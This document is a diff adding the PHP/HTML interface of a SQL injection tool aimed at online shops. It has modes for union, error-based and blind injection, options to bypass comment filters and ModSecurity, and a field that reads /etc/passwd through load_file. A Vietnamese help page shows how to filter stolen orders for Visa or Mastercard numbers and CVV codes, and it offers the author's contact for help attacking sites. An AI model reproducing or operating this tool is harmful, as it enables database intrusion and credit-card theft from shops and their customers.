@@ -1,0 +1,336 @@
+<TITLE>MYSQL INJECTION</TITLE> 
+<script type="text/javascript" src="exploit.js" >
+</script>
+<style>
+body
+{
+	background:#000000;
+	font-weight:bold;
+	color:00CC00;
+}
+a
+{
+	color:00CC00;
+	background:#000000;
+}
+.classOfTR
+{
+	font-weight:bold;
+	background:#696969;
+}
+input
+{
+	background:#222222;
+	color:00CC00;
+}
+textarea
+{
+	background:#222222;
+	color:00CC00;
+}
+select
+{
+	background:#222222;
+	color:00CC00;
+}
+</style>
+<BODY><center>
+MYSQL INJECTION <BR>
+==================================================================================================<br>
+<a href="?exploit=1" color="white" >EXPLOIT 1</a> | <a href="?exploit=2">EXPLOIT 2</a> | <a href="?exploit=version4">VERSION4</a> | <a href="?exploit=blind">BLIND</a> | <a href="?exploit=support">SUPPORT</a><br>
+<?php
+	@require("function_class.php");
+	if($_GET["exploit"]==1)
+	{
+	
+	################# PRINT EXPLOIT 1 #################
+	?>
+		<!-- print input options -->
+
+		<input type="hidden" id="urlFileAjax" value="<?php echo "http://".$_SERVER["HTTP_HOST"].str_replace(strrchr($_SERVER["PHP_SELF"],"/"),"/exploit1.php",$_SERVER["PHP_SELF"]); ?>">
+		<input type="hidden" id="exploit" value="1" />
+		<br/>
+		<div id="setup">
+		Link : <input type="text" id="url" size="70"/>
+		<input type="text" id="countColumn" size=2 />
+		<input type="text" id="exploitColumn" size=2 />
+		<?php printCommentBypass($arrCommentBypass,"commentBypass"); ?>
+		<br/>
+		<input type="hidden" id="secBypass" value="3">
+		<table>
+		<tr>
+			<td><input type="radio" id="encodeBypass_0" name="encodeBypass" checked></td><td> none </td>
+			<td><input type="radio" id="useGroupConcat_0" name="useGroupConcat" onclick="enable();" checked></td><td> speed : <input type="text" value=1 id="speed" size=2></td>
+		</tr>
+		<tr>
+			<td><input type="radio" id="encodeBypass_1" name="encodeBypass" ></td><td> unhex(hex())</td>
+			<td><input type="radio" id="useGroupConcat_1" name="useGroupConcat" onclick="enable();"></td><td> use group_concat</td>
+		</tr>
+		<tr>
+			<td></td><td></td>
+			<td><input type="radio" id="encodeBypass_2" name="encodeBypass" ></td><td> CONVERT("something" USING latin1)</td>
+			<td></td><td><input type="submit" value="AUTO DETECT" onClick="exploit1(0)" /><input type="submit" value="START" onClick="exploit1(1)" /></td>
+		</tr>
+		</table>
+		</div>
+
+		<!-- print output -->
+		<p>
+		<table border="1" cellpadding="2" style='text-align:center'>
+		<tr class="classOfTR">
+			<td width="350">Infor</td>
+			<td width="350">Tables</td>
+			<td width="350">Columns</td>
+			<td width="350">Load file</td>
+		</tr>
+		<tr>
+			<td><div id="info">&nbsp;</div></td>
+			<td><div id="table">&nbsp;</div></td>
+			<td><div id="column">&nbsp;</div></td>
+			<td><div id="load_file"><input type="text" value="/etc/passwd" id="file"><input type="submit" value="load" onClick="exploit1(4)" ></div></td>
+		</tr>
+		</table>
+
+		<p>
+		<table border="1" cellpadding="2" style='text-align:center'>
+		<tr class="classOfTR">
+			<td>&nbsp</td>
+			<td>Addition</td>
+			<td width="1000">Data</td>
+		</tr>
+		<tr style='text-align:left;vertical-align:top;'>
+			<td>
+			<table>
+				<tr><td>Database</td><td><input type="text" id="dbGetData" size="20" /></td></tr>
+				<tr><td>Table</td><td><input type="text" id="tableGetData" size="20" /></td></tr>
+				<tr><td>List column</td><td><textarea cols="20" rows="17" id="listColumnGetData"></textarea></td></tr>
+			</table>
+			</td>
+			<td style='text-align:left'>
+			<div id="additions">
+				<table>
+				<tr><td>Filter by column</td><td><input type="text" id="columnFilterGetData" /></td></tr>
+				<tr><td>From</td><td><input type="text" id="from" size="5"/></td></tr>
+				<tr><td>To</td><td><input type="text" id="to" size="5"/></td></tr>
+				</table>
+				how to use ? example : <br/>
+				cc_number>0<br/>
+				cc_expyear>2010<br/>
+				....<br/>
+				<textarea cols="20" rows="10" id="addition"></textarea>
+			</div>
+			</td>
+			<td>NOTE : SPEED 5 ~ 20 <br><input type="checkbox" id="newTab"> open new tab <br><input type="submit" value="GET" onClick="exploit1(7)"><br><div id="data"></div></td>
+		</tr>
+		</table>
+		</center>
+		
+	   
+	<?php }
+
+
+
+
+	################# PRINT EXPLOIT 2 #################
+	elseif($_GET["exploit"]==2)
+	{
+		?>
+
+		<!-- print input options -->
+		<input type="hidden" id="urlFileAjax" value="<?php echo "http://".$_SERVER["HTTP_HOST"].str_replace(strrchr($_SERVER["PHP_SELF"],"/"),"/exploit2.php",$_SERVER["PHP_SELF"]); ?>">
+		<input type="hidden" id="exploit" value="2" />
+		<br/>
+		<div id="setup">
+		Link : <input type="text" id="url" size="70"/>
+		<?php printCommentBypass($arrCommentBypass,"commentBypass"); ?>
+		<br/>
+
+
+		<table>
+		<tr>
+			<td><input type="radio" id="secBypass_0" name="secBypass" checked ></td><td width=200> none </td>
+			<td><input type="checkbox" id="useGroupConcat" name="useGroupConcat" onClick="enable()"></td><td>use group_concat (it can't use if shop has too much tables,columns)</td>
+		</tr>
+		<tr>
+			<td><input type="radio" id="secBypass_1" name="secBypass" ></td><td> bypass mod security</td>
+			<td>strlen (40-60 are the best) </td><td><input type="text" id="strlen"  size="3" disabled /></td>
+		</tr>
+		<tr>
+			<td></td><td></td>
+			<td></td><td><input type="submit" value="AUTO DETECT" onClick="exploit2(0)" /><input type="submit" value="START" onClick="exploit2(1)" /></td>
+		</tr>
+		</table>
+		</div>
+		
+		<!-- print output -->
+		<p>
+		<table border="1" cellpadding="2" style='text-align:center'>
+		<tr class="classOfTR">
+			<td width="300">Infor</td>
+			<td width="300">Tables</td>
+			<td width="300">Columns</td>
+			<td width="300">ID</td>
+		</tr>
+		<tr>
+			<td><div id="info">&nbsp;</div></td>
+			<td><div id="table">&nbsp;</div></td>
+			<td><div id="column">&nbsp;</div></td>
+			<td><div id="id">&nbsp;</div></td>
+		</tr>
+		</table>
+		
+		<p>
+		<table border="1" cellpadding="2" style='text-align:center'>
+		<tr class="classOfTR">
+			<td>&nbsp</td>
+			<td>Addition</td>
+			<td width="1000">Data</td>
+		</tr>
+		<tr style='text-align:left;vertical-align:top;'>
+			<td>
+			<table>
+				<tr><td>Database</td><td><input type="text" id="dbGetData" size="20" /></td></tr>
+				<tr><td>Table</td><td><input type="text" id="tableGetData" size="20" /></td></tr>
+				<tr><td>List column</td><td><textarea cols="20" rows="17" id="listColumnGetData"></textarea></td></tr>
+			</table>
+			</td>
+			<td style='text-align:left'>
+			<table>
+			<tr><td>Filter by column</td><td><input type="text" id="columnFilterGetData" /></td></tr>
+			<tr><td>From</td><td><input type="text" id="from" size="5"/></td></tr>
+			<tr><td>To</td><td><input type="text" id="to" size="5"/></td></tr>
+			</table>
+			how to use ? example : <br/>
+			cc_number>0<br/>
+	        cc_expyear>2010<br/>
+			....<br/>
+			<textarea cols="20" rows="10" id="addition"></textarea></td>
+			<td><input type="submit" value="GET" onClick="exploit2(5)"><br/><div id="data"></div></td>
+		</tr>
+		</table>
+		</center>
+
+
+	<?php
+	}
+	elseif($_GET["exploit"]=="version4")
+	{
+	?>
+
+
+		<input type="hidden" id="urlFileAjax" value="<?php echo "http://".$_SERVER["HTTP_HOST"].str_replace(strrchr($_SERVER["PHP_SELF"],"/"),"/version4.php",$_SERVER["PHP_SELF"]); ?>">
+		<input type="hidden" id="exploit" value="1" />
+		<br/>
+		Link : <input type="text" id="url" size="70"/>
+		<?php printCommentBypass($arrCommentBypass,"commentBypass"); ?>
+		<br/>
+		True page has : <input type="text" id="string" size="44"/> Speed : <input type="text" id="speed" size="2" maxlength="2"/><br/>
+
+		<table>
+		<tr>
+			<td><input type="radio" id="secBypass_0" name="secBypass" checked ></td><td> none </td>
+			<td><input type="radio" id="tableType_1" name="tableType"></td><td> table admin , admins , tbadmin ... </td>
+		</tr>
+		<tr>
+			<td><input type="radio" id="secBypass_1" name="secBypass" ></td><td> /*! something */</td>
+			<td><input type="radio" id="tableType_2" name="tableType"></td><td> table order , orders , tborders ... </td>
+		</tr>
+		<tr>
+			<td></td><td></td>
+			<td></td><td><input type="submit" value="LOAD DATA TABLES" onClick="version4(1)" /><input type="submit" value="LOAD DATA COLUMNS" onClick="version4(2)" /></td>
+		<tr>
+
+		</table>
+
+		<b>
+		<table border="1" cellpadding="2" style='text-align:center'>
+		<tr class="classOfTR">
+			<td width="500">Table</td>
+			<td width="500">Column</td>
+		</tr>
+		<tr style="text-align:left">
+			<td><div id="listTable">&nbsp;</div></td>
+			<td><div id="listColumn">&nbsp;</div></td>
+		</tr>
+		</table>
+	<?php
+	}
+	elseif($_GET["exploit"]=="blind")
+	{
+	?>
+		<input type="hidden" id="urlFileAjax" value="<?php echo "http://".$_SERVER["HTTP_HOST"].str_replace(strrchr($_SERVER["PHP_SELF"],"/"),"/blind.php",$_SERVER["PHP_SELF"]); ?>">
+		<input type="hidden" id="exploit" value="2" />
+		<br/>
+		Link : <input type="text" id="url" size="70"/>
+		<?php printCommentBypass($arrCommentBypass,"commentBypass"); ?>
+		<br/>
+
+
+		<table>
+		<tr>
+			<td><input type="radio" id="secBypass_0" name="secBypass" checked ></td><td> none </td>
+			<td><input type="checkbox" id="limitChar_0" checked></td><td>a-z</td>
+			<td><input type="checkbox" id="limitChar_2"></td><td>0-9</td>
+		</tr>
+		<tr>
+			<td><input type="radio" id="secBypass_1" name="secBypass" ></td><td> /*! something */</td>
+			<td><input type="checkbox" id="limitChar_1"></td><td>A-Z</td>
+			<td><input type="checkbox" id="limitChar_3"></td><td>special_char ( you can edit )<input type="text" id="specialChar" value="_ | - | ? | * | ( | )" /></td>
+		</tr>
+		<tr>
+			<td></td><td></td>
+			<td></td><td></td>
+			<td></td><td>true page has<input type="text" id="string" /><input type="submit" value="BLIND" onClick="blind(1)" /></td>
+		</table>
+
+		<table border="1" cellpadding="2" style='text-align:center'>
+		<tr class="classOfTR">
+			<td width="300">Infor</td>
+			<td width="300">Tables</td>
+			<td width="300">Columns</td>
+			<td width="300">ID</td>
+		</tr>
+		<tr>
+			<td><div id="info">&nbsp;</div></td>
+			<td style='text-align:left'><br/> db <input type="text" id="dbs"><input type="submit" value="blind table" onClick="blind(2)"/><br/><div id="table"></div></td>
+			<td style='text-align:left'> db&nbsp;&nbsp;&nbsp; <input type="text" id="dbToGetColumn"><br/>
+				table <input type="text" id="tables"><input type="submit" value="blind column" onClick="blind(3)"/><br/><div id="column"></div></td>
+			<td><div id="id">&nbsp;</div></td>
+		</tr>
+		</table>
+
+
+	<?php
+	}
+	elseif($_GET["exploit"]=="support")
+	{
+		?>
+		<div style='text-align:left'>
+			1 . Neu link loi~ "http://site.com/product.php?<font color="red">a=1'</font>&b=2&c=3" thi edit thanh "http://site.com/product.php?b=2&c=3&<font color="red">a=1</font>"<br>
+			2 . Khi tool dang chay. , bam' esc neu' muon' dung` lai.<br>
+			3 . Exploit2 chi? su? dung. dc khi co' xuat' thong^ bao' loi~ "you have an error ...."<br>
+			4 . Su? dung. group_concat de? tang toc' do. , khi group_concat ko get het' dc table,column thi` bo? chon. group_concat de? get lai.<br>
+			5 . O? phan` get data , cai' o^ to to trong phan` addition<br>
+			 _ length() , substr() ,...<br>
+			 _ VD :<br><table border=1>
+			 	 	<tr><td>chi? get nhung~ order su? dung visa thi` go~ vao : </td><td>substr([cc_number,card_number,....],1,1)=4</td>
+			 	  <tr><td>chi? get nhung~ order su? dung master thi` go~ vao : </td><td>substr([cc_number,card_number,....],1,1)=5</td>
+			 	  <tr><td>chi? get nhung~ order co' ccnumber 16 ki tu : </td><td>length([cc_number,card_number,....])=16</td>
+			 	  <tr><td>chi? get nhung~ order co' ton` tai. ccv : </td><td>([cc_cvv,card_cvv,....])>0</td>
+			 	  <tr><td>visa hoac. master : </td><td>substr([cc_number,card_number,....],1,1)=4 or substr([cc_number,card_number,....],1,1)=5</td>
+			 		<tr><td>visa va` ton tai ccv : </td><td>substr([cc_number,card_number,....],1,1)=4<br>([cc_cvv,card_cvv,....])>0</td>
+			 		</table>
+			 6 . [HOT]khi su? dung. auto detect phai? giu~ nguyen link , ko them^ dau' -
+			 														
+			updating ...<br>
+			** Moi. site tool hack ko dc. vui long lien he. YH : hoangduye de? dc giup do~ su? dung. tool<br>
+		</div>
+											 
+			<?php
+	}
+	else
+	{
+		echo "Choose a exploit";
+	}
+
+	?>
